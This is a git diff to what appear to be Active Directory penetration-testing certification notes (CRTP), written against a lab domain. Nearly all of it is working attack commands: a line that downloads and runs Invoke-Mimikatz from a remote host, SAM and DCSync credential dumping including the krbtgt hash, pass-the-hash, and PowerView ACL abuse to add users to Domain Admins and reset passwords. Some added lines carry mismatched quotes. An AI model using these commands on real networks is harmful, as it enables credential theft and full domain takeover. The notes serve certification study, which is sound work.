@@ -1953,6 +1953,8 @@ iex (iwr http://172.16.100.7/Invoke-Mimikatz.ps1 -UseBasicParsing)
 3. execute this command to get the local passwords on the domain controller
 ```
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
+# OR
+Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername <target>
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3408dd39-c4af-4617-9ae2-11621abcde9f)
 4. now before we apply the Pass the hash technique, we need to add the Logon Behavior element in the registry and give it the value 2 so that we can use the NTLM hash in it.
@@ -1969,3 +1971,33 @@ sekurlsa::pth /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /domain
 dir \\dcorp-dc\C$
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3a4ec50e-3551-4563-884b-f6c29ea6498e)
+
+# ACLs
+https://crtp-certification.certs-study.com/domain-persistence/acls/adminsdholder
+###  Check the Domain Admins permission - PowerView as normal user
+```
+Get-DomainObjectACL -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SideToName $_SecurityIdentitifer);$_} | ?{$_.IdentityName -match "student1"}
+```
+### Abusing FullControll using PowerView
+```
+Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
+```
+### Abusing ResetPassword using PowerView
+```
+Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123 -AsPlainText -Force") -Verbose
+```
+
+# DCSync
+you need to have Replication (DCSync) rights to perform the attack
+### Add full-control rights
+```
+Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
+```
+### Add rights for DCsync
+```
+Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose
+```
+### Execute DCSync and dump krbtgt
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
+```
